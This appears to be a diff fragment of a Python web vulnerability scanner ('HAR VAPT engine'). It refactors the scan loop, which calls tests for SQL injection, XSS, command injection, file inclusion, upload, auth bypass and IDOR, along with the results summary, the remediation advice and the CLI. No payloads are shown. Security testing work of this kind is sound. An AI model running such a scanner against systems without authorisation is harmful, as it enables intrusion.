         print(f"🚀 Starting comprehensive VAPT scan...")
-        print(f"📊 Target: {self.config.get('target_domain', 'Unknown')}")
-        print(f"🎯 Testing {len(self.endpoints)} endpoints")
+        print(f"📊 Target: {target}")
+        print(f"🎯 Total endpoints: {len(self.endpoints)}")
+        print(f"🔧 Fuzzable endpoints: {len(fuzzable)} (with {sum(len(e['_fuzz_params']) for e in fuzzable)} params)")
+        print(f"📁 Real upload endpoints: {len(uploads)}")
 
-        start_time = time.time()
+        t0 = time.time()
 
-        # Run all vulnerability tests
-        sql_results = self.test_sql_injection()
-        file_upload_results = self.test_file_upload_rce()
-        auth_bypass_results = self.test_authentication_bypass()
-        idor_results = self.test_idor()
-        xss_results = self.test_xss()
+        self.test_sql_injection()
+        self.test_xss()
+        self.test_command_injection()
+        self.test_lfi()
+        self.test_file_upload()
+        self.test_auth_bypass()
+        self.test_idor()
+        self.test_security_headers()
 
-        end_time = time.time()
-        scan_duration = end_time - start_time
+        duration = time.time() - t0
 
-        # Generate summary
         summary = {
             'scan_info': {
-                'target': self.config.get('target_domain'),
-                'start_time': datetime.fromtimestamp(start_time).isoformat(),
-                'end_time': datetime.fromtimestamp(end_time).isoformat(),
-                'duration_seconds': scan_duration,
-                'endpoints_tested': len(self.endpoints)
+                'target': target,
+                'start_time': datetime.fromtimestamp(t0).isoformat(),
+                'end_time': datetime.now().isoformat(),
+                'duration_seconds': round(duration, 1),
+                'endpoints_total': len(self.endpoints),
+                'endpoints_fuzzed': len(fuzzable),
+                'upload_endpoints': len(uploads),
             },
             'vulnerability_summary': {
                 'total_vulnerabilities': len(self.vulnerabilities),
-                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
-                'high': len([v for v in self.vulnerabilities if v['severity'] == 'high']),
-                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
-                'low': len([v for v in self.vulnerabilities if v['severity'] == 'low'])
+                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
+                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
+                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium'),
+                'low': sum(1 for v in self.vulnerabilities if v['severity'] == 'low'),
             },
             'test_results': self.test_results,
             'vulnerabilities': self.vulnerabilities,
-            'recommendations': self._generate_recommendations()
+            'recommendations': self._recommendations(),
         }
-
         return summary
 
-    def _generate_recommendations(self) -> List[str]:
-        """Generate remediation recommendations based on findings"""
-        recommendations = []
-
-        vuln_types = set(v['type'] for v in self.vulnerabilities)
-
-        if 'SQL Injection' in str(vuln_types):
-            recommendations.extend([
-                'Implement parameterized queries for all database interactions',
-                'Add input validation and sanitization for all parameters',
-                'Use prepared statements and stored procedures',
-                'Implement proper error handling to prevent information disclosure'
-            ])
-
-        if 'File Upload RCE' in str(vuln_types):
-            recommendations.extend([
-                'Implement strict file type validation',
-                'Scan uploaded files for malicious content',
-                'Store uploaded files outside the web root',
-                'Implement file size and upload rate limiting'
-            ])
-
-        if 'Authentication Bypass' in str(vuln_types):
-            recommendations.extend([
-                'Implement proper authentication controls on all admin endpoints',
-                'Add session timeout and regeneration',
-                'Implement role-based access control (RBAC)',
-                'Add IP-based access restrictions for administrative functions'
-            ])
-
-        if 'IDOR' in str(vuln_types):
-            recommendations.extend([
-                'Implement proper authorization checks for data access',
-                'Use indirect object references or UUIDs',
-                'Add access control lists (ACLs) for sensitive data',
-                'Log all data access attempts for monitoring'
-            ])
-
-        if 'XSS' in str(vuln_types):
-            recommendations.extend([
-                'Implement output encoding for all user inputs',
-                'Use Content Security Policy (CSP) headers',
-                'Validate and sanitize all input data',
-                'Use security libraries for XSS prevention'
-            ])
-
-        return recommendations
-
-    def save_results(self, filename: str = None) -> str:
-        """Save scan results to file"""
-        if not filename:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"har_vapt_results_{timestamp}.json"
-
-        try:
-            results = self.run_comprehensive_scan()
-            with open(filename, 'w', encoding='utf-8') as f:
-                json.dump(results, f, indent=2, default=str)
-
-            print(f"\n💾 Results saved to: {filename}")
-            return filename
-        except Exception as e:
-            print(f"❌ Error saving results: {e}")
-            return None
+    def _recommendations(self) -> List[str]:
+        types = {v['type'] for v in self.vulnerabilities}
+        recs = []
+        if any('SQL' in t for t in types):
+            recs.append('Use parameterized queries / prepared statements for all DB access')
+        if any('XSS' in t or 'SSTI' in t for t in types):
+            recs.append('Implement output encoding and Content-Security-Policy')
+        if any('Command' in t for t in types):
+            recs.append('Never pass user input to shell commands; use safe APIs')
+        if any('File Upload' in t for t in types):
+            recs.append('Validate file type by content (magic bytes), disable script execution in upload dirs')
+        if any('Auth' in t for t in types):
+            recs.append('Enforce authentication on all dynamic endpoints')
+        if any('IDOR' in t for t in types):
+            recs.append('Implement server-side authorization checks for all data access')
+        if any('Header' in t or 'Cookie' in t or 'TRACE' in t for t in types):
+            recs.append('Add HSTS, CSP, X-Content-Type-Options headers; set Secure+HttpOnly on cookies; disable TRACE')
+        return recs
 
 
 def main():
-    """Command-line interface for HAR VAPT Engine"""
     import sys
-
     if len(sys.argv) < 2:
-        print("Usage: python har_vapt_engine.py <har_analysis_file> [output_file]")
+        print("Usage: python har_vapt_engine.py <har_analysis.json> [output.json]")
         return
-
-    analysis_file = sys.argv[1]
-    output_file = sys.argv[2] if len(sys.argv) > 2 else None
-
-    try:
-        with open(analysis_file, 'r') as f:
-            har_analysis = json.load(f)
-
-        engine = HARVAPTEngine(har_analysis)
-        result_file = engine.save_results(output_file)
-
-        if result_file:
-            print(f"\n🎉 VAPT scan completed successfully!")
-            print(f"📊 Found {len(engine.vulnerabilities)} vulnerabilities")
-            print(f"📋 Results saved to: {result_file}")
-
-    except Exception as e:
-        print(f"❌ Error: {e}")
+    with open(sys.argv[1]) as f:
+        analysis = json.load(f)
+    engine = HARVAPTEngine(analysis)
+    results = engine.run_comprehensive_scan()
+    out = sys.argv[2] if len(sys.argv) > 2 else f"har_vapt_{int(time.time())}.json"
+    with open(out, 'w') as f:
+        json.dump(results, f, indent=2, default=str)
+    print(f"\n💾 Results: {out}")
+    print(f"📊 {len(engine.vulnerabilities)} findings")
 
 
 if __name__ == "__main__":
